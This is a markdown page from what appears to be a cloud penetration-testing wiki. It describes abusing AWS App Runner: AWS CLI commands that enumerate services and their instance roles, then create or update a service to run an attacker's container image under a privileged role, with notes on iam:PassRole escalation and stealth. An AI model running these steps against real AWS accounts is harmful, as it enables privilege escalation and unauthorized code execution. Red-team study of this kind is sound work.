---
title: "App Runner: instance role and deployment abuse"
order: 7
description: "Abusing App Runner services and their instance role, and source or image deployment to run attacker code."
keywords:
  - App Runner
  - instance role
  - service
  - image
  - deployment
---

# App Runner

App Runner is a managed container-and-web-app runtime. A service runs with an **instance role** (the role your application code assumes) and optionally an access role for pulling from ECR. Creating or updating a service with your image or source runs your code with that instance role, and deploying from a connected source repository is a supply-chain path.

## Deploying your code

```bash
aws apprunner list-services
aws apprunner describe-service --service-arn <arn> \
  --query 'Service.InstanceConfiguration.InstanceRoleArn'

# Point a service at your image to run code under its instance role
aws apprunner create-service --service-name x \
  --source-configuration 'ImageRepository={ImageIdentifier=<acct>.dkr.ecr.<region>.amazonaws.com/you:latest,ImageRepositoryType=ECR}' \
  --instance-configuration 'InstanceRoleArn=<privileged-role>'
```

## Exploitation notes

- Creating a service with a chosen instance role needs `iam:PassRole`, so it is also an identity privilege-escalation path.
- The running container reads its role from the App Runner credential endpoint, the same pattern as ECS task roles in [containers](containers.md).
- Updating an existing service to your image is quieter than creating a new one and inherits the existing role.

## Tools

- **AWS CLI** (`apprunner create-service`, `update-service`, `describe-service`).

## References

- [AWS: App Runner instance roles](https://docs.aws.amazon.com/apprunner/latest/dg/security-iam-roles.html)
- [HackTricks Cloud: AWS services](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/index.html)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
- [Stratus Red Team: AWS techniques](https://stratus-red-team.cloud/attack-techniques/AWS/)
- [Pacu (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/pacu)
